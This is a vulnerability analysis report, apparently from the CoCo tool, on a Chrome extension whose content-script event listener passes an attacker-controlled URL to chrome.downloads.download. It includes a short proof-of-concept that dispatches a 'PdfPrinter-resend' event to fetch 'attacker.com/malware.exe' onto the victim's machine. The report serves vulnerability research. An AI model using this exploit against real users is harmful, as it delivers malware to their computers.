# CoCo Analysis: nilliopfnijnmfhbeamlobibgmcmjljk

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1

---

## Sink: document_eventListener_PdfPrinter-resend → chrome_downloads_download_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nilliopfnijnmfhbeamlobibgmcmjljk/opgen_generated_files/cs_0.js
Line 472	document.addEventListener("PdfPrinter-resend", function(e) {
Line 473	chrome.runtime.sendMessage(e.detail);

$FilePath$/home/teofanescu/cwsCoCo/extensions_local/nilliopfnijnmfhbeamlobibgmcmjljk/opgen_generated_files/bg.js
Line 981	url: request.blobUrl,

**Code:**

```javascript
// Content script - Entry point (cs_0.js Line 472)
document.addEventListener("PdfPrinter-resend", function(e) {
  chrome.runtime.sendMessage(e.detail); // ← attacker-controlled
});

// Background script - Message handler (bg.js Line 976)
function onMessageFromPage(request, sender) {
  switch (request.command) {
    case "returnBlobUrl":
      fileName = this.generateFileName();
      chrome.downloads.download({
        url: request.blobUrl, // ← attacker-controlled URL
        filename: "FlatterFilesDownloads/" + fileName + ".pdf"
      }, function (downloadId) {
        downloadParams[downloadId] = {
          id: sender.tab.id,
          command: request.initialCommand,
          frameId: sender.frameId
        }
      });
      break;
    default:
      // ... native messaging code ...
  }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** DOM event (document.addEventListener)

**Attack:**

```javascript
// From any webpage where content script is injected:
// (matches: localhost, 0.0.0.0, 10.211.55.2, *.flatterfiles.com, *.drawingmanager.appspot.com)
const maliciousEvent = new CustomEvent("PdfPrinter-resend", {
  detail: {
    command: "returnBlobUrl",
    blobUrl: "https://attacker.com/malware.exe"
  }
});
document.dispatchEvent(maliciousEvent);
```

**Impact:** Arbitrary file download vulnerability. An attacker on a webpage matching the content script patterns can dispatch a custom DOM event to trigger downloads of arbitrary files from attacker-controlled URLs. The extension will download any file to the user's computer with a .pdf extension in the "FlatterFilesDownloads" directory. This can be exploited to deliver malware, phishing pages, or other malicious content to the victim's system.
